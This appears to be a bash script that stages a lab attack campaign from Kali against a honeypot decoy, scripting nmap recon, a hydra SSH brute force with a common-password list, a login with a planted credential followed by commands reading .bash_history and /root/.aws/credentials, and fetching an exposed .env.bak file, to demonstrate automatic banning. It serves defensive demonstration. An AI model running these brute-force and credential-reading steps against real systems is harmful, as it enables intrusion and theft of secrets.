#!/usr/bin/env bash
# filepath: https://github.com/rabakuku/Youtube/blob/main/Video-4-HoneyWall-Live-Deception-SOC/scripts/kali-attack-campaign.sh
#
# HoneyWall - attack campaign for the video. Runs ON KALI (192.168.40.3) against the decoys only.
#
#   ./kali-attack-campaign.sh              menu
#   ./kali-attack-campaign.sh --all        Acts 0 → 1 → 2 → 3 → 3B → 4 with narration pauses
#   ./kali-attack-campaign.sh --act 3      one act
#
# Acts (docs/Lab-Matrix.md section 9):
#   0  Preflight      tools + reachability (run BEFORE any ban - a banned Kali cannot apt-install)
#   1  Recon          nmap -sV 22,80 + robots.txt
#   2  Brute force    hydra against root/admin -> threshold ban
#   3  Let them in    one clean login with the leaked svc_backup credential -> honeytoken -> ban mid-command
#   3B Web bait       Corp Backup Console -> /backup/.env.bak -> ban
#   4  Proof          connections time out while banned
set -uo pipefail

TARGET="${TARGET:-192.168.40.1}"
SSH_PORT=22
WEB_PORT=80
LEAKED_USER="svc_backup"
LEAKED_PASS='Summer2026!'          # matches compose/userdb.txt (deliberately public decoy credential)
ALLOWED_NET="192.168.40."          # only the Users-VLAN decoy VIP is a valid target
FAST=0
PAUSE=1
ASSUME_YES=0
ACT=""

# ------------------------------------------------------------------ look & feel
if [ -t 1 ]; then
  R=$'\e[0m'; B=$'\e[1m'; DIM=$'\e[2m'; RED=$'\e[1;31m'; GRN=$'\e[1;32m'; YEL=$'\e[1;33m'; CYN=$'\e[1;36m'; MAG=$'\e[1;35m'
else R=""; B=""; DIM=""; RED=""; GRN=""; YEL=""; CYN=""; MAG=""; fi
ts() { date +%H:%M:%S; }
say()  { printf '%s%s%s %s\n' "$DIM" "$(ts)" "$R" "$*"; }
good() { printf '%s%s%s %s✔%s %s\n' "$DIM" "$(ts)" "$R" "$GRN" "$R" "$*"; }
bad()  { printf '%s%s%s %s✘%s %s\n' "$DIM" "$(ts)" "$R" "$RED" "$R" "$*"; }
note() { printf '%s%s%s %s▸%s %s\n' "$DIM" "$(ts)" "$R" "$YEL" "$R" "$*"; }
die()  { bad "$*"; exit 1; }

banner() {
  printf '%s' "$RED"
  cat <<'EOF'
   ___  _   _            _      ___
  / _ \| |_| |_ __ _ __| |__  / __|__ _ _ __  _ __  __ _(_)__ _ _ _
 | (_) |  _|  _/ _` / _| / / | (__/ _` | '  \| '_ \/ _` | / _` | ' \
  \___/ \__|\__\__,_\__|_\_\  \___\__,_|_|_|_| .__/\__,_|_\__, |_||_|
                                             |_|          |___/
EOF
  printf '%s  target: %s (srv-corp-ssh01 + Corp Backup Console)   attacker: %s%s\n\n' "$DIM" "$TARGET" "$(my_ip)" "$R"
}

act_title() { # number, title, one-line what-happens
  printf '\n%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n' "$MAG" "$R"
  printf '%s ACT %s · %s%s\n' "$B" "$1" "$2" "$R"
  printf '%s %s%s\n' "$DIM" "$3" "$R"
  printf '%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n' "$MAG" "$R"
}

type_out() { # print text like a human typing (to the local terminal)
  local s="$1" i
  if [ "$FAST" = 1 ]; then printf '%s' "$s"; return; fi
  for ((i = 0; i < ${#s}; i++)); do printf '%s' "${s:i:1}"; sleep "0.0$((RANDOM % 5 + 2))"; done
}
show_cmd() { printf '%s%s%s %s$%s ' "$DIM" "$(ts)" "$R" "$GRN" "$R"; type_out "$1"; printf '\n'; sleep 0.3; }
run() { show_cmd "$*"; "$@"; }

pause() {
  [ "$PAUSE" = 1 ] || return 0
  [ -t 0 ] || return 0
  printf '\n%s[ press Enter for %s ]%s' "$CYN" "$1" "$R"; read -r _
}

my_ip() { ip -4 -o addr show 2>/dev/null | awk '!/ lo /{print $4}' | cut -d/ -f1 | head -n1; }

reachable() { nc -z -w 2 "$TARGET" "$1" >/dev/null 2>&1; }

usage() {
  cat <<EOF
HoneyWall attack campaign (run on Kali)

Usage: $0 [--act 0|1|2|3|3b|4] [--all] [options]     (no options = menu)

  --act N        Run one act (0 preflight, 1 recon, 2 brute force, 3 leaked login + honeytoken,
                 3b web bait, 4 proof)
  --all          Acts 0 → 1 → 2 → [Unban] → 3 → [Unban] → 3b → 4
  --no-pause     Do not wait for Enter between acts (straight run)
  --fast         No typewriter effect
  --reset-check  Wait until the FortiGate lets this IP through again (after you click Unban)
  --target IP    Decoy VIP (default 192.168.40.1; must be in 192.168.40.0/24)
  --yes          Install missing tools without asking
  -h, --help     This help
EOF
}

# ------------------------------------------------------------------ arguments
while [ $# -gt 0 ]; do
  case "$1" in
    --act) ACT="${2:-}"; shift 2 ;;
    --all) ACT="all"; shift ;;
    --no-pause) PAUSE=0; shift ;;
    --fast) FAST=1; shift ;;
    --reset-check) ACT="reset"; shift ;;
    --target) TARGET="${2:-}"; shift 2 ;;
    --yes|-y) ASSUME_YES=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) usage; die "unknown option: $1" ;;
  esac
done
ACT="$(printf '%s' "$ACT" | tr '[:upper:]' '[:lower:]')"

# safety: lab decoy only
[[ "$TARGET" =~ ^192\.168\.40\.[0-9]{1,3}$ ]] && [[ "$TARGET" == "$ALLOWED_NET"* ]] \
  || die "refusing target '$TARGET': this campaign only attacks the lab decoy VIP in 192.168.40.0/24"

# ------------------------------------------------------------------ act 0: preflight
need_tools() {
  local miss=() t
  for t in nmap hydra sshpass curl nc ssh timeout; do command -v "$t" >/dev/null 2>&1 || miss+=("$t"); done
  printf '%s' "${miss[*]:-}"
}

act0() {
  act_title 0 "Preflight" "Tools, reachability and the self-lockout warning. Run this before any ban."
  . /etc/os-release 2>/dev/null || true
  [ "${ID:-}" = kali ] && good "Kali ${VERSION:-}" || note "not Kali (${ID:-?}) - should still work on Debian/Ubuntu"
  good "attacker IP $(my_ip)"
  local miss; miss="$(need_tools)"
  if [ -n "$miss" ]; then
    note "missing: $miss"
    local pkgs=""
    for t in $miss; do case "$t" in nc) pkgs="$pkgs netcat-openbsd" ;; timeout) pkgs="$pkgs coreutils" ;; ssh) pkgs="$pkgs openssh-client" ;; *) pkgs="$pkgs $t" ;; esac; done
    if [ "$ASSUME_YES" = 1 ] || { [ -t 0 ] && read -r -p "Install with apt-get:$pkgs ? [Y/n] " a && [[ ! "$a" =~ ^[Nn] ]]; }; then
      sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $pkgs >/dev/null || die "apt-get failed"
    else die "tools missing: $miss"; fi
    miss="$(need_tools)"; [ -z "$miss" ] || die "still missing: $miss"
  fi
  good "tools: nmap hydra sshpass curl nc ssh"
  if reachable "$SSH_PORT"; then good "decoy SSH  $TARGET:$SSH_PORT reachable"; else bad "decoy SSH  $TARGET:$SSH_PORT not reachable (FortiGate VIP/policy from Stage 5? still banned?)"; fi
  if reachable "$WEB_PORT"; then good "decoy web  $TARGET:$WEB_PORT reachable"; else bad "decoy web  $TARGET:$WEB_PORT not reachable"; fi
  if [ -n "${SSH_CONNECTION:-}" ]; then
    note "you are on SSH (${SSH_CONNECTION%% *}). When HoneyWall bans $(my_ip), this session may FREEZE."
    note "record the attack from the Kali VM console, and click Unban from your PC."
  fi
}

# ------------------------------------------------------------------ act 1: recon
act1() {
  act_title 1 "Recon" "Scan the server and look around the website. Nothing gets banned yet."
  run nmap -sV -Pn -p "$SSH_PORT,$WEB_PORT" "$TARGET"
  run curl -s "http://$TARGET/robots.txt"
  show_cmd "curl -sI http://$TARGET/login | grep -i server"
  curl -sI "http://$TARGET/login" | grep -i '^server' || true
  note "an OpenSSH server and an nginx 'Backup Console' with a hidden /backup/ folder - juicy."
}

# ------------------------------------------------------------------ act 2: brute force
act2() {
  act_title 2 "Brute force (noisy)" "Hydra hammers root/admin. HoneyWall bans after 5 failures in 30 s."
  local dir; dir="$(mktemp -d)"
  printf 'root\nadmin\n' > "$dir/users.txt"
  printf '%s\n' 123456 password admin root toor qwerty letmein P@ssw0rd changeme 12345678 \
    welcome Passw0rd! admin123 raspberry ubuntu kali iloveyou dragon monkey master > "$dir/pass.txt"
  show_cmd "hydra -L users.txt -P pass.txt -t 4 -V ssh://$TARGET"
  timeout 35 hydra -I -L "$dir/users.txt" -P "$dir/pass.txt" -t 4 -W 1 -V -o /dev/null "ssh://$TARGET:$SSH_PORT" 2>&1 \
    | grep --line-buffered -E 'ATTEMPT|login:|ERROR|could not|timeout|refused' \
    | sed -u -e "s/^/  /" | head -n 60 || true
  rm -rf "$dir"
  if reachable "$SSH_PORT"; then note "decoy still answers - not banned yet (threshold or Stage 5 config?)"
  else bad "the decoy stopped answering: $(my_ip) is QUARANTINED on the FortiGate"; fi
}

# ------------------------------------------------------------------ act 3: let them in, slam the door
act3() {
  act_title 3 "Let them in… slam the door (stealthy)" "One quiet login with a leaked password, a look around, then the AWS keys."
  note "found on a paste site:  ${LEAKED_USER} / ${LEAKED_PASS}"
  local cmds=("whoami" "id" "uname -a" "ls -la" "cat .bash_history" "cat /root/.aws/credentials" "aws s3 ls" "exit")
  show_cmd "ssh ${LEAKED_USER}@${TARGET}"
  {
    sleep 3
    local c i
    for c in "${cmds[@]}"; do
      for ((i = 0; i < ${#c}; i++)); do printf '%s' "${c:i:1}"; [ "$FAST" = 1 ] || sleep "0.0$((RANDOM % 6 + 4))"; done
      printf '\r'
      case "$c" in "cat .bash_history") sleep 3.5 ;; "cat /root/.aws/credentials") sleep 4 ;; *) sleep 1.6 ;; esac
    done
    sleep 15
  } | SSHPASS="$LEAKED_PASS" timeout 60 sshpass -e ssh -tt -p "$SSH_PORT" \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR \
        -o PubkeyAuthentication=no -o PreferredAuthentications=password \
        -o ServerAliveInterval=2 -o ServerAliveCountMax=3 -o ConnectTimeout=6 \
        "${LEAKED_USER}@${TARGET}"
  local rc=$?
  printf '\n'
  case "$rc" in
    255) bad "ssh: the connection died mid-command - the FortiGate is dropping $(my_ip)" ;;
    124) bad "session frozen - nothing comes back from $TARGET" ;;
    0)   note "session ended normally (was the ban fired? check the dashboard)" ;;
    *)   bad "ssh exited with $rc" ;;
  esac
}

# ------------------------------------------------------------------ act 3B: web bait
act3b() {
  act_title 3B "Web bait (bonus)" "The website looks harmless. The open /backup/ folder is the trap."
  show_cmd "curl -sI http://$TARGET/ | head -n 3"
  curl -sI -m 5 "http://$TARGET/" | head -n 3 | tr -d '\r' | sed 's/^/  /' 
  show_cmd "curl -s http://$TARGET/backup/"
  curl -s -m 5 "http://$TARGET/backup/" | sed -n 's/.*href="\([^"]*\)".*/  \1/p' | grep -v '^  \.\./$'
  local u p
  for up in "admin:admin" "svc_backup:backup123"; do
    u="${up%%:*}"; p="${up#*:}"
    show_cmd "curl -s -d 'username=$u&password=$p' http://$TARGET/login"
    curl -s -m 5 -d "username=$u&password=$p" "http://$TARGET/login" | grep -o 'Invalid username or password' | sed 's/^/  /' || true
    sleep 0.8
  done
  show_cmd "curl -s http://$TARGET/backup/.env.bak"
  curl -s -m 5 "http://$TARGET/backup/.env.bak" | sed 's/^/  /'
  sleep 1.5
  show_cmd "curl -m 5 http://$TARGET/login"
  if curl -s -o /dev/null -m 5 "http://$TARGET/login"; then note "still answering - not banned yet"
  else bad "timeout: the web server vanished too - $(my_ip) is QUARANTINED"; fi
}

# ------------------------------------------------------------------ act 4: proof
act4() {
  act_title 4 "Proof" "Every door is closed while the ban stands. Watch the dashboard and the FortiGate."
  local i
  for i in 1 2 3 4 5 6; do
    if reachable "$SSH_PORT"; then good "attempt $i  ssh  $TARGET:$SSH_PORT  open"
    else bad "attempt $i  ssh  $TARGET:$SSH_PORT  timed out"; fi
    if curl -s -o /dev/null -m 2 "http://$TARGET/"; then good "attempt $i  http $TARGET:$WEB_PORT  open"
    else bad "attempt $i  http $TARGET:$WEB_PORT  timed out"; fi
  done
  note "look at: HoneyWall → 'Banned on FortiGate' + Replay tab; FortiGate GUI/CLI banned-IP list (docs/Fortinet-cli.md)"
  note "when you're done: click Unban on HoneyWall, then: $0 --reset-check"
}

# ------------------------------------------------------------------ reset check
reset_check() {
  local waited=0 spin='|/-\'
  say "waiting for the FortiGate to let $(my_ip) through again (click Unban on HoneyWall)…"
  while ! reachable "$SSH_PORT"; do
    printf '\r  %s waiting %ss ' "${spin:waited%4:1}" "$waited"
    sleep 1; waited=$((waited + 3))
    [ "$waited" -gt 600 ] && { printf '\n'; die "still blocked after 10 minutes"; }
  done
  printf '\r'; good "released - $TARGET:$SSH_PORT answers again                "
}

# ------------------------------------------------------------------ main
run_act() {
  case "$1" in
    0) act0 ;; 1) act1 ;; 2) act2 ;; 3) act3 ;; 3b) act3b ;; 4) act4 ;; reset) reset_check ;;
    *) die "unknown act '$1' (0, 1, 2, 3, 3b, 4)" ;;
  esac
}

run_all() {
  act0;  pause "Act 1 (recon)"
  act1;  pause "Act 2 (brute force)"
  act2
  note "now click Unban on HoneyWall"; reset_check; pause "Act 3 (leaked login)"
  act3
  note "now click Unban on HoneyWall"; reset_check; pause "Act 3B (web bait)"
  act3b; pause "Act 4 (proof)"
  act4
  printf '\n%sCampaign complete.%s\n' "$B" "$R"
}

banner
if [ -z "$ACT" ]; then
  printf '  0) Preflight   1) Recon   2) Brute force   3) Leaked login + honeytoken\n'
  printf '  3b) Web bait   4) Proof   a) All acts      r) Wait for Unban   q) Quit\n'
  read -r -p "Act: " ACT
  ACT="$(printf '%s' "$ACT" | tr '[:upper:]' '[:lower:]')"
  case "$ACT" in a) ACT=all ;; r) ACT=reset ;; q|"") exit 0 ;; esac
fi
if [ "$ACT" = all ]; then run_all; else run_act "$ACT"; fi
